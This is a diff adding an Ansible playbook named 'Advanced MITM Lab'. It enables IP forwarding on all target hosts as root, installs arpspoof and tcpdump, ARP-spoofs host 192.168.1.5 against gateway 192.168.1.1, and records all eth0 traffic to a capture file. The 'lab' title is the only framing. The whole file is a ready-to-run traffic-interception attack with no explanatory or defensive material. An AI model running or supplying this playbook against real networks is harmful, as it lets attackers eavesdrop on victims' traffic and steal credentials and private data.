@@ -1,0 +1,25 @@
+- name: Advanced MITM Lab
+  hosts: all
+  become: yes
+  tasks:
+    - name: Enable IP forwarding
+      sysctl:
+        name: net.ipv4.ip_forward
+        value: 1
+        state: present
+    - name: Install ARP spoofing tools
+      apt:
+        name: arpspoof
+        state: present
+    - name: Start ARP spoofing
+      command: arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
+      async: 600
+      poll: 0
+    - name: Capture network traffic
+      apt:
+        name: tcpdump
+        state: present
+    - name: Start tcpdump capture
+      command: tcpdump -i eth0 -w /tmp/capture.pcap
+      async: 600
+      poll: 0
